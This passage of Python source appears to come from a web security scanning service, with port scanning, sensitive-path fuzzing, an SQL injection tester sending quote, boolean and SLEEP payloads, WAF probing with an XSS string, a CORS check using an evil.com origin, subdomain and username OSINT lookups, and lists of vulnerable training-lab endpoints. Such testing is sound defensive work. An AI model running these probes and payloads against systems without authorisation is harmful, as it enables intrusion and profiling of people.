                return {"port":port,"proto":"tcp","state":"open","service":_SVC.get(port,"unknown"),"version":banner}
            except: return None
    results = await asyncio.gather(*[_probe(p) for p in ports])
    return [r for r in results if r]


async def _banner_grab(host: str, ports=None) -> dict:
    open_ports = await _tcp_scan(host, ports or [21,22,25,80,443,8080,3306,3389], timeout=2.0)
    return {str(p["port"]): p["version"] for p in open_ports if p["version"]}


_FUZZ_PATHS = [
    "admin","admin/","admin/login","administrator","login","login.php",
    "wp-admin","wp-login.php","wp-config.php",".env","config.php",
    "phpinfo.php","info.php","test.php","debug.php","status","health",
    ".git/HEAD",".git/config",".svn/entries",".DS_Store",
    "backup.zip","backup.sql","backup.tar.gz","db.sql","database.sql",
    "robots.txt","sitemap.xml",".well-known/security.txt",
    "web.config",".htaccess",".htpasswd","server-status","server-info",
    "phpmyadmin","pma","adminer.php","adminer","console",
    "api","api/v1","api/v2","swagger.json","swagger-ui.html",
    "openapi.json","api-docs","graphql","graphiql",
    "actuator","actuator/env","actuator/health","actuator/mappings",
    "upload","uploads","files","images","include","includes","lib","vendor",
    "install.php","setup.php","update.php","register.php",
    "config.yml","config.yaml","config.json","settings.php",
    "package.json","composer.json","Dockerfile","docker-compose.yml",
    "old","backup","temp","tmp","cache","logs","log","error.log",
    "manager","manager/html","webdav","xmlrpc.php","crossdomain.xml",
    "cgi-bin/test.cgi","dvwa","dvwa/login.php","WebGoat","mutillidae","bWAPP",
    # DVWA vulnerability pages
    "dvwa/vulnerabilities/sqli/","dvwa/vulnerabilities/sqli_blind/",
    "dvwa/vulnerabilities/xss_r/","dvwa/vulnerabilities/xss_s/","dvwa/vulnerabilities/xss_d/",
    "dvwa/vulnerabilities/exec/","dvwa/vulnerabilities/fi/","dvwa/vulnerabilities/upload/",
    "dvwa/vulnerabilities/csrf/","dvwa/vulnerabilities/brute/","dvwa/vulnerabilities/idor/",
    "dvwa/vulnerabilities/weak_id/","dvwa/vulnerabilities/captcha/","dvwa/vulnerabilities/javascript/",
    "dvwa/vulnerabilities/csp/","dvwa/vulnerabilities/open_redirect/",
    # Mutillidae
    "mutillidae/index.php","mutillidae/webservices/","mutillidae/data/",
    # bWAPP
    "bWAPP/sqli_1.php","bWAPP/xss_get.php","bWAPP/htmli_get.php","bWAPP/cmdi.php",
    # WebGoat
    "WebGoat/start.mvc","WebGoat/login","WebGoat/register.mvc",
    # Juice Shop
    "rest/user/login","rest/products/search","api/Challenges",
]

# Known vulnerable parameters per lab — used by scanners to test deep paths
_LAB_TARGETS = {
    "lab_dvwa": [
        ("dvwa/vulnerabilities/sqli/",        "id",    "get"),
        ("dvwa/vulnerabilities/sqli_blind/",   "id",    "get"),
        ("dvwa/vulnerabilities/xss_r/",        "name",  "get"),
        ("dvwa/vulnerabilities/xss_d/",        "default","get"),
        ("dvwa/vulnerabilities/fi/",           "page",  "get"),
        ("dvwa/vulnerabilities/exec/",         "ip",    "post"),
        ("dvwa/vulnerabilities/open_redirect/","redirect","get"),
    ],
    "lab_mutillidae": [
        ("mutillidae/index.php", "username", "get"),
        ("mutillidae/index.php", "page",     "get"),
        ("mutillidae/index.php", "popUpNotificationCode", "get"),
    ],
    "lab_webgoat": [
        ("WebGoat/SqlInjection/attack5a", "account", "get"),
    ],
    "lab_bwapp": [
        ("bWAPP/sqli_1.php",  "title",  "get"),
        ("bWAPP/xss_get.php", "firstname", "get"),
        ("bWAPP/cmdi.php",    "target", "post"),
    ],
    "lab_juiceshop": [
        ("rest/products/search", "q", "get"),
        ("rest/user/login",      "email", "post"),
    ],
    "testphp.vulnweb.com": [
        ("http://testphp.vulnweb.com/listproducts.php", "cat",      "get"),
        ("http://testphp.vulnweb.com/artists.php",      "artist",   "get"),
        ("http://testphp.vulnweb.com/search.php",       "searchFor","get"),
        ("http://testphp.vulnweb.com/userinfo.php",     "username", "get"),
        ("http://testphp.vulnweb.com/guestbook.php",    "name",     "get"),
    ],
}


def _parse_forms(html: str, base: str) -> list:
    """Extract (form_url, input_name) pairs from HTML forms."""
    results = []
    parsed_base = urlparse(base)
    forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
    form_actions = re.findall(r'<form[^>]+action=["\']?([^"\'>\s]+)["\']?', html, re.IGNORECASE)
    for idx, form_body in enumerate(forms):
        action = form_actions[idx] if idx < len(form_actions) else ""
        if not action or action == "#": action = base
        if action.startswith("http"):   form_url = action
        elif action.startswith("/"):    form_url = f"{parsed_base.scheme}://{parsed_base.netloc}{action}"
        else:                           form_url = base.rstrip("/") + "/" + action
        input_names = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form_body, re.IGNORECASE)
        input_names += re.findall(r'<select[^>]+name=["\']([^"\']+)["\']', form_body, re.IGNORECASE)
        for name in input_names:
            results.append((form_url, name))
    return results

def _get_lab_targets(base_url: str):
    """Return known vulnerable endpoints for this lab target."""
    for key, targets in _LAB_TARGETS.items():
        if key in base_url:
            parsed = urlparse(_web_url(base_url))
            base = f"{parsed.scheme}://{parsed.netloc}"
            return [(f"{base}/{path}", param, method) for path, param, method in targets]
    return []

async def _python_fuzz(base_url: str, concurrency: int=20, custom_paths: list=None, extra_headers: dict=None) -> list:
    found = []
    base = _web_url(base_url).rstrip("/")
    sem = asyncio.Semaphore(concurrency)
    loop = asyncio.get_event_loop()
    paths = custom_paths if custom_paths else _FUZZ_PATHS
    hdrs = dict(_BROWSER_HEADERS)
    if extra_headers: hdrs.update(extra_headers)

    def _sync_check(path):
        try:
            r = _req_lib.get(f"{base}/{path}", timeout=6, verify=False,
                             headers=hdrs, allow_redirects=False)
            if r.status_code in (200, 201, 301, 302, 403):
                return {"path": f"/{path}", "status": r.status_code,
                        "size": len(r.content),
                        "content_type": r.headers.get("content-type","").split(";")[0].strip(),
                        "redirect": r.headers.get("location","")}
        except: pass
        return None

    async def _check(path):
        async with sem:
            result = await loop.run_in_executor(None, _sync_check, path)
            if result:
                found.append(result)

    await asyncio.gather(*[_check(p) for p in paths])
    return sorted(found, key=lambda x: x["path"])


_SQL_ERRORS = [
    "you have an error in your sql syntax","warning: mysql_","mysql_fetch",
    "unclosed quotation mark","quoted string not properly terminated",
    "pg_query(): query failed","pg_exec()","sqliteexception","sqlite3.operationalerror",
    "ora-00933:","ora-01756:","ora-00907:","microsoft ole db provider",
    "odbc microsoft access driver","sqlsyntaxerrorexception",
    "invalid query","com.mysql.jdbc.exceptions","java.sql.sqlexception",
]

async def _sqli_engine(base_url: str) -> list:
    findings = []; tested = set(); param_done = set()
    base = _web_url(base_url).rstrip("/")
    params = []
    # Add known lab-specific vulnerable endpoints
    for url, param, method in _get_lab_targets(base_url):
        if method == "get":
            key = f"{url}::{param}"
            if key not in tested:
                tested.add(key); params.append((url, param, "1"))
    home = _http_get(base, timeout=10)
    if home:
        # Also parse form actions for GET forms
        for form_url, input_name in _parse_forms(home.text, base)[:10]:
            key = f"{form_url}::{input_name}"
            if key not in tested:
                tested.add(key); params.append((form_url, input_name, "1"))
        links = re.findall(r'href=["\']([^"\'#\s]+)["\']', home.text, re.IGNORECASE)
        links.append(base)
        for link in links[:30]:
            if link.startswith("http"): full = link
            elif link.startswith("/"): full = f"{urlparse(base).scheme}://{urlparse(base).netloc}{link}"
            else: full = base+"/"+link
            if "?" not in full: continue
            up, _, qs = full.partition("?")
            for pair in qs.split("&"):
                if "=" not in pair: continue
                pn, _, pv = pair.partition("=")
                key = f"{up}::{pn}"
                if key not in tested:
                    tested.add(key); params.append((up, pn, pv or "1"))
    for p in ["id","cat","page","item","product","user","search","q","s","view"]:
        key = f"{base}::{p}"
        if key not in tested:
            tested.add(key); params.append((base.split("?")[0], p, "1"))
    for url, param, _ in params[:25]:
        if param in param_done: continue
        for pl in ["'", "\"", "' OR '1'='1'--"]:
            r = _http_get(f"{url}?{param}={pl}", timeout=8)
            if r and any(e in r.text.lower() for e in _SQL_ERRORS):
                findings.append({"detail":f"SQL Injection (error-based) in parameter '{param}'","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
                param_done.add(param); break
        if param in param_done: continue
        r1 = _http_get(f"{url}?{param}=1 AND 1=1--", timeout=8)
        r2 = _http_get(f"{url}?{param}=1 AND 1=2--", timeout=8)
        if r1 and r2 and abs(len(r1.text)-len(r2.text)) > 100:
            findings.append({"detail":f"SQL Injection (boolean-blind) in parameter '{param}' — page size differs for true/false conditions","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
            param_done.add(param); continue
        t0 = _time.monotonic()
        _http_get(f"{url}?{param}=1 AND SLEEP(3)--", timeout=7)
        if _time.monotonic()-t0 >= 2.5:
            findings.append({"detail":f"SQL Injection (time-based blind) in parameter '{param}' — SLEEP(3) caused measurable delay","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
            param_done.add(param)
    return findings


def _ssl_analyze(host: str, port: int=443) -> list:
    findings = []
    try:
        ctx = _ssl_lib.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = _ssl_lib.CERT_NONE
        with _socket_lib.create_connection((host, port), timeout=10) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                proto = s.version(); cipher = s.cipher(); cert = s.getpeercert()
                if proto in ("TLSv1","TLSv1.1","SSLv2","SSLv3"):
                    findings.append({"detail":f"Weak TLS protocol in use: {proto} — vulnerable to POODLE/BEAST","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-326","cwe_name":"Weak Encryption","owasp":"A02:2021","remediation":"Disable TLS 1.0/1.1. Use TLS 1.2+ only."})
                if cipher and any(w in cipher[0].upper() for w in ["RC4","DES","3DES","EXPORT","NULL","ANON"]):
                    findings.append({"detail":f"Weak cipher suite: {cipher[0]}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-327","cwe_name":"Broken Algorithm","owasp":"A02:2021","remediation":"Use AES-GCM or ChaCha20-Poly1305."})
                if cert:
                    na = cert.get("notAfter","")
                    if na:
                        exp = datetime.datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                        now = datetime.datetime.utcnow()
                        if exp < now:
                            findings.append({"detail":f"SSL certificate EXPIRED on {exp.date()}","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-295","cwe_name":"Certificate Expired","owasp":"A02:2021","remediation":"Renew SSL certificate immediately."})
                        elif (exp-now).days < 30:
                            findings.append({"detail":f"SSL certificate expires in {(exp-now).days} days ({exp.date()})","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"Certificate Expiry","owasp":"A02:2021","remediation":"Renew SSL certificate before expiry."})
                    subj = dict(x[0] for x in cert.get("subject",[]))
                    issr = dict(x[0] for x in cert.get("issuer",[]))
                    if subj == issr:
                        findings.append({"detail":"Self-signed SSL certificate — browsers will show security warnings","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"Self-Signed Certificate","owasp":"A02:2021","remediation":"Use a certificate from a trusted CA (Let's Encrypt is free)."})
    except _ssl_lib.SSLError as e:
        findings.append({"detail":f"SSL error: {e}","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"SSL Error","owasp":"A02:2021","remediation":"Review SSL/TLS configuration."})
    except Exception: pass
    return findings


def _dns_enum_records(host: str) -> list:
    records = []
    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
        try:
            for ans in _dns_resolver.resolve(host, rtype, lifetime=5):
                records.append({"type":rtype,"value":str(ans)})
        except: pass
    return records


def _whois_query(host: str) -> dict:
    try:
        w = _whois_lib.whois(host)
        def _s(v): return str(v[0] if isinstance(v, list) else v or "")
        return {"registrar":_s(w.registrar),"created":_s(w.creation_date),
                "expires":_s(w.expiration_date),"updated":_s(w.updated_date),
                "name_servers":list(w.name_servers or []),"status":_s(w.status),
                "emails":list(w.emails or []),"raw":str(w.text or "")[:3000]}
    except: return {}


_WAF_SIGS = {
    "Cloudflare":["cf-ray","cloudflare","__cfduid"],
    "AWS WAF":["x-amzn-requestid","x-amz-cf-id"],
    "Akamai":["akamaiedge","x-akamai-request-id"],
    "Imperva/Incapsula":["x-iinfo","incapsula","visid_incap"],
    "F5 BIG-IP":["bigipserver","x-waf-event-info"],
    "Sucuri":["x-sucuri-id","sucuri"],
    "ModSecurity":["mod_security","modsecurity"],
    "Barracuda":["barra_counter_session","x-barracuda"],
    "Wordfence":["wordfence"],
    "Azure WAF":["x-azure-ref","x-ms-request-id"],
}

def _detect_waf(url: str):
    try:
        r1 = _req_lib.get(url, timeout=10, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        r2 = _req_lib.get(url+"?q=<script>alert(1)</script>&id=1'", timeout=10, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        hdrs = {k.lower():v.lower() for k,v in {**dict(r1.headers),**dict(r2.headers)}.items()}
        body = (r1.text+r2.text).lower()[:5000]
        for name, sigs in _WAF_SIGS.items():
            for sig in sigs:
                if sig in hdrs or any(sig in k for k in hdrs) or sig in body:
                    return name
        if r2.status_code in (403,406,429,503) and r1.status_code==200:
            return "Unknown WAF"
    except: pass
    return None


# Static-host detection — these CDNs serve static files and cannot execute server-side code.
# When detected, dynamic-execution checks (command injection, RFI, LFI, SSTI, deserialization, etc.)
# are guaranteed false positives and must be skipped.
_STATIC_HOST_SIGNATURES = {
    # Server header value (lowercase) → host name
    "netlify":      "Netlify",
    "cloudflare":   "Cloudflare Pages/CDN",
    "vercel":       "Vercel",
    "github.io":    "GitHub Pages",
    "gh-pages":     "GitHub Pages",
    "amazons3":     "AWS S3",
    "cloudfront":   "AWS CloudFront",
    "firebase":     "Firebase Hosting",
    "render":       "Render Static",
    "surge":        "Surge.sh",
    "fastly":       "Fastly CDN",
    "akamai":       "Akamai CDN",
}

def _detect_static_host(url: str):
    """If the URL is served by a known static-only CDN, return its name. Otherwise None.

    Static hosts cannot execute server-side code, so dynamic-execution vuln checks against
    them produce false positives. Used by command-injection, RFI, LFI, SSTI, etc. scanners
    to skip dynamic checks entirely.
    """
    try:
        r = _req_lib.get(url, timeout=8, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        srv = (r.headers.get("Server","") + " " + r.headers.get("server","")).lower()
        via = (r.headers.get("Via","") + " " + r.headers.get("via","")).lower()
        x_powered = (r.headers.get("X-Powered-By","") + " " + r.headers.get("x-powered-by","")).lower()
        haystack = srv + " " + via + " " + x_powered
        for sig, host in _STATIC_HOST_SIGNATURES.items():
            if sig in haystack:
                return host
    except Exception:
        pass
    return None


def _baseline_then_payload(url: str, payload_query: str, timeout: int = 8):
    """Fetch baseline + payload response so a scanner can compare and skip false positives.

    Returns (baseline_response, payload_response) or (None, None) on error.
    A dynamic-execution finding is only credible if the payload response differs MEANINGFULLY
    from the baseline — same body length and same status = no execution happened.
    """
    try:
        # Strip any existing query so baseline is clean
        from urllib.parse import urlparse, urlunparse
        u = urlparse(url)
        base_url = urlunparse((u.scheme, u.netloc, u.path, "", "", ""))
        r_base = _req_lib.get(base_url, timeout=timeout, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        sep = "&" if u.query else "?"
        payload_url = base_url + (("?" + u.query + "&") if u.query else "?") + payload_query.lstrip("?&")
        r_payload = _req_lib.get(payload_url, timeout=timeout, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        return r_base, r_payload
    except Exception:
        return None, None


def _response_meaningfully_different(r_base, r_payload, threshold: int = 50) -> bool:
    """True if payload response differs meaningfully from baseline (suggests server-side execution).

    SPAs serve the same index.html for every URL, so r_base == r_payload → false positive.
    Threshold = minimum byte difference to be considered "meaningful".
    """
    if not (r_base and r_payload):
        return False
    if r_base.status_code != r_payload.status_code:
        return True
    if abs(len(r_base.content) - len(r_payload.content)) > threshold:
        return True
    return False


_TECH_SIGS = [
    ("WordPress",["/wp-content/","/wp-includes/","wp-json","generator.*wordpress"]),
    ("Joomla",["/components/com_","mosConfig_","joomla"]),
    ("Drupal",["/sites/default/","drupal.js","Drupal.settings"]),
    ("Shopify",["cdn.shopify.com","myshopify.com"]),
    ("Django",["csrfmiddlewaretoken","django"]),
    ("Laravel",["laravel_session","illuminate"]),
    ("Rails",["authenticity_token","x-runtime"]),
    ("ASP.NET",["__viewstate","asp.net_sessionid","x-aspnet-version"]),
    ("React",["react.production.min.js","_next","data-reactroot"]),
    ("Angular",["ng-version","angular.min.js","<app-root"]),
    ("Vue",["vue.min.js","__vue__"]),
]

def _detect_tech(url: str) -> list:
    detected = []
    r = _http_get(url, timeout=10)
    if not r: return detected
    corpus = r.text.lower() + str({k.lower():v.lower() for k,v in r.headers.items()})
    for name, pats in _TECH_SIGS:
        if any(re.search(p, corpus, re.IGNORECASE) for p in pats):
            detected.append(name)
    hdrs = {k.lower():v for k,v in r.headers.items()}
    if hdrs.get("server"): detected.append(f"Server: {hdrs['server']}")
    if hdrs.get("x-powered-by"): detected.append(f"X-Powered-By: {hdrs['x-powered-by']}")
    return detected


async def _enum_subdomains(host: str) -> list:
    subs = set()
    try:
        r = _http_get(f"https://crt.sh/?q=%.{host}&output=json", timeout=20)
        if r and r.status_code==200:
            for entry in r.json():
                for n in entry.get("name_value","").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n.endswith(host) and n!=host: subs.add(n)
    except: pass
    common = ["www","mail","ftp","smtp","api","dev","staging","test","beta","admin",
              "portal","webmail","cdn","static","secure","app","docs","blog","shop","m"]
    async def _resolve(sub):
        loop = asyncio.get_event_loop()
        try:
            await loop.run_in_executor(None, lambda: _dns_resolver.resolve(f"{sub}.{host}","A",lifetime=3))
            return f"{sub}.{host}"
        except: return None
    for r in await asyncio.gather(*[_resolve(s) for s in common]):
        if r: subs.add(r)
    return sorted(subs)


async def _username_osint(username: str) -> list:
    platforms = [
        ("GitHub",f"https://github.com/{username}"),
        ("Twitter/X",f"https://twitter.com/{username}"),
        ("Instagram",f"https://www.instagram.com/{username}"),
        ("Reddit",f"https://www.reddit.com/user/{username}"),
        ("TikTok",f"https://www.tiktok.com/@{username}"),
        ("YouTube",f"https://www.youtube.com/@{username}"),
        ("Twitch",f"https://www.twitch.tv/{username}"),
        ("Medium",f"https://medium.com/@{username}"),
        ("GitLab",f"https://gitlab.com/{username}"),
        ("HackerNews",f"https://news.ycombinator.com/user?id={username}"),
        ("DEV.to",f"https://dev.to/{username}"),
        ("Keybase",f"https://keybase.io/{username}"),
        ("Pinterest",f"https://www.pinterest.com/{username}"),
        ("Bitbucket",f"https://bitbucket.org/{username}"),
    ]
    found = []
    connector = _aiohttp.TCPConnector(ssl=False, limit=10)
    async with _aiohttp.ClientSession(connector=connector, timeout=_aiohttp.ClientTimeout(total=8), headers=_BROWSER_HEADERS) as sess:
        sem = asyncio.Semaphore(8)
        async def _chk(name, url):
            async with sem:
                try:
                    async with sess.get(url, allow_redirects=True) as r:
                        if r.status==200:
                            found.append({"platform":name,"url":str(r.url),"status":"found"})
                except: pass
        await asyncio.gather(*[_chk(n,u) for n,u in platforms])
    return found


def _dnstwist_check(domain: str) -> list:
    parts = domain.split(".",1)
    if len(parts)<2: return []
    base, tld = parts[0], parts[1]
    perms = set()
    for i in range(len(base)):
        perms.add(base[:i]+base[i+1:]+"."+tld)
        perms.add(base[:i]+base[i]+base[i:]+"."+tld)
    for i in range(len(base)-1):
        s=list(base); s[i],s[i+1]=s[i+1],s[i]; perms.add("".join(s)+"."+tld)
    for alt in [".com",".net",".org",".info",".co",".io"]:
        if "."+tld!=alt: perms.add(base+alt)
    for k,v in {"o":"0","l":"1","i":"1","a":"@","s":"5"}.items():
        if k in base: perms.add(base.replace(k,v,1)+"."+tld)
    results = []
    for perm in list(perms)[:60]:
        try:
            _dns_resolver.resolve(perm,"A",lifetime=2)
            results.append({"domain":perm,"registered":True,"a_record":True})
        except: pass
    return results


_VULN_PATHS = [
    ("/.git/HEAD",200,"ref:","Git repository exposed — source code accessible","CRITICAL"),
    ("/.git/config",200,"[core]","Git config file exposed","CRITICAL"),
    ("/.env",200,None,".env file exposed — may contain API keys and credentials","CRITICAL"),
    ("/wp-config.php",200,"DB_","WordPress config exposed — database credentials visible","CRITICAL"),
    ("/phpinfo.php",200,"phpinfo","PHP info page exposed — reveals full PHP configuration","HIGH"),
    ("/info.php",200,"phpinfo","PHP info page exposed","HIGH"),
    ("/debug.php",200,None,"PHP debug file exposed","HIGH"),
    ("/server-status",200,"Apache","Apache server-status page exposed","MEDIUM"),
    ("/backup.zip",200,None,"Backup archive publicly accessible","CRITICAL"),
    ("/backup.tar.gz",200,None,"Backup archive publicly accessible","CRITICAL"),
    ("/backup.sql",200,None,"SQL backup file exposed","CRITICAL"),
    ("/database.sql",200,None,"SQL database file exposed","CRITICAL"),
    ("/.htpasswd",200,None,".htpasswd credential file exposed","CRITICAL"),
    ("/web.config",200,"configuration","web.config exposed — reveals .NET configuration","HIGH"),
    ("/phpmyadmin/",200,"phpMyAdmin","phpMyAdmin database admin panel exposed","CRITICAL"),
    ("/pma/",200,"phpMyAdmin","phpMyAdmin accessible","CRITICAL"),
    ("/adminer.php",200,"adminer","Adminer database UI exposed","CRITICAL"),
    ("/install.php",200,None,"Install script accessible — may allow re-installation","HIGH"),
    ("/setup.php",200,None,"Setup script accessible","HIGH"),
    ("/xmlrpc.php",200,None,"XML-RPC enabled — brute force and DDoS amplification vector","MEDIUM"),
    ("/swagger.json",200,"swagger","Swagger API docs exposed — reveals all endpoints","MEDIUM"),
    ("/openapi.json",200,"openapi","OpenAPI spec exposed","MEDIUM"),
    ("/graphql",200,None,"GraphQL endpoint exposed — check for introspection","MEDIUM"),
    ("/actuator/env",200,None,"Spring Boot actuator /env exposed — reveals environment variables","CRITICAL"),
    ("/actuator/health",200,None,"Spring Boot actuator /health exposed","LOW"),
    ("/actuator/mappings",200,None,"Spring Boot actuator /mappings exposed — reveals all routes","MEDIUM"),
    ("/.DS_Store",200,None,"Mac .DS_Store file exposed — reveals directory structure","LOW"),
    ("/.svn/entries",200,None,"SVN repository metadata exposed","HIGH"),
    ("/composer.json",200,"require","composer.json exposed — reveals PHP dependencies and versions","LOW"),
    ("/package.json",200,"dependencies","package.json exposed — reveals Node.js dependencies","LOW"),
    ("/Dockerfile",200,"FROM","Dockerfile exposed — reveals infrastructure details","MEDIUM"),
    ("/docker-compose.yml",200,"services","docker-compose.yml exposed — reveals service configuration","HIGH"),
    ("/config.json",200,None,"Config JSON file exposed","HIGH"),
    ("/robots.txt",200,"Disallow","robots.txt exposes hidden paths (check Disallow entries)","LOW"),
    ("/crossdomain.xml",200,None,"crossdomain.xml may allow cross-origin Flash access","MEDIUM"),
]

async def _nikto_scan(base_url: str) -> list:
    findings = []
    base = _web_url(base_url).rstrip("/")
    bl_r = _http_get(base+"/", timeout=8)
    bl_size = len(bl_r.content) if bl_r and bl_r.status_code==200 else None
    if bl_r:
        hdrs = {k.lower():v for k,v in bl_r.headers.items()}
        srvr = hdrs.get("server","")
        if re.search(r"apache/[\d.]+|nginx/[\d.]+|iis/[\d.]+", srvr, re.IGNORECASE):
            findings.append({"detail":f"Server version disclosure: {srvr}","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-200","cwe_name":"Information Exposure","owasp":"A05:2021","remediation":"Remove version number from Server header."})
        if hdrs.get("x-powered-by"):
            findings.append({"detail":f"X-Powered-By reveals technology: {hdrs['x-powered-by']}","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-200","cwe_name":"Information Exposure","owasp":"A05:2021","remediation":"Remove the X-Powered-By header."})
    connector = _aiohttp.TCPConnector(ssl=False, limit=20)
    async with _aiohttp.ClientSession(connector=connector, timeout=_aiohttp.ClientTimeout(total=8, connect=4), headers=_BROWSER_HEADERS) as sess:
        sem = asyncio.Semaphore(20)
        async def _chk(path, exp, cmatch, detail, sev):
            async with sem:
                try:
                    async with sess.get(f"{base}{path}", allow_redirects=False) as r:
                        if r.status==403:
                            findings.append({"detail":f"{path} present but access denied (403) — resource exists on server","severity":"MEDIUM" if sev not in ("CRITICAL",) else "HIGH","cvss":"5.3","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Present","owasp":"A05:2021","remediation":f"Remove {path} from the web root."})
                            return
                        if r.status!=exp: return
                        body = await r.text(errors="replace")
                        if bl_size and len(body)==bl_size: return
                        if cmatch and cmatch.lower() not in body.lower(): return
                        cvss = "9.8" if sev=="CRITICAL" else "7.5" if sev=="HIGH" else "5.3" if sev=="MEDIUM" else "3.1"
                        findings.append({"detail":detail,"severity":sev,"cvss":cvss,"cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Remove or restrict access to {path}."})
                except: pass
        await asyncio.gather(*[_chk(*c) for c in _VULN_PATHS])
    return findings


def _cyclic_pattern(size: int) -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    pat = ""
    for i,j,k in _itertools.product(range(len(chars)), repeat=3):
        pat += chars[i]+chars[j]+chars[k]
        if len(pat) >= size: return pat[:size]
    return pat[:size]


@app.post("/api/scan/wafw00f")
async def scan_wafw00f(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    loop = asyncio.get_event_loop()
    waf = await loop.run_in_executor(None, _detect_waf, _web_url(req.target))
    out = f"WAF detected: {waf}" if waf else "No WAF detected"
    findings = [{"detail":f"WAF detected: {waf}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"WAF","owasp":"N/A","remediation":"WAF is a defensive control."}] if waf else []
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"wafw00f",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"wafw00f","waf":waf,"detected":bool(waf),"findings":findings,"output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/whatweb")
async def scan_whatweb(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    loop = asyncio.get_event_loop()
    detected = await loop.run_in_executor(None, _detect_tech, _web_url(req.target))
    out = ", ".join(detected) if detected else "No technologies detected"
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"whatweb",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","detected":detected,"output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/nmap")
async def scan_nmap(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    ports = await _tcp_scan(host)
    out = "\n".join(f"{p['port']}/tcp open {p['service']} {p['version']}" for p in ports)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"nmap",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap","ports":ports,"total_open":len(ports),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/cors")
async def scan_cors(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    try:
        r = _req_lib.get(_web_url(req.target),timeout=15,verify=False,headers={**_BROWSER_HEADERS,"Origin":"https://evil.com"},allow_redirects=True)
        acao = r.headers.get("Access-Control-Allow-Origin","")
        acac = r.headers.get("Access-Control-Allow-Credentials","")
        if acao in ("*","https://evil.com"):
            vulnerable = True
            findings.append({"detail":f"CORS: Access-Control-Allow-Origin: {acao}","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Restrict CORS to trusted origins only."})
        if acac.lower()=="true" and acao!="":
            vulnerable = True
            findings.append({"detail":"CORS: Credentials allowed with permissive origin","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Never combine Access-Control-Allow-Credentials: true with wildcard origins."})
    except Exception as e:
        findings.append({"detail":f"CORS scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"cors",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cors","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/gobuster")
async def scan_gobuster(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    items = await _python_fuzz(req.target, custom_paths=req.wordlist, extra_headers=_make_req_headers(req) if (req.auth_cookie or req.auth_bearer) else None)
    discovered = [item["path"] for item in items if item["status"]==200]
    out = "\n".join(f"/{item['status']} {item['path']}" for item in items)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"gobuster",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"gobuster","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/subdomains")
async def scan_subdomains(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    subdomains = await _enum_subdomains(host)
    out = "\n".join(subdomains)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"subdomains",req.target,{"output":out})
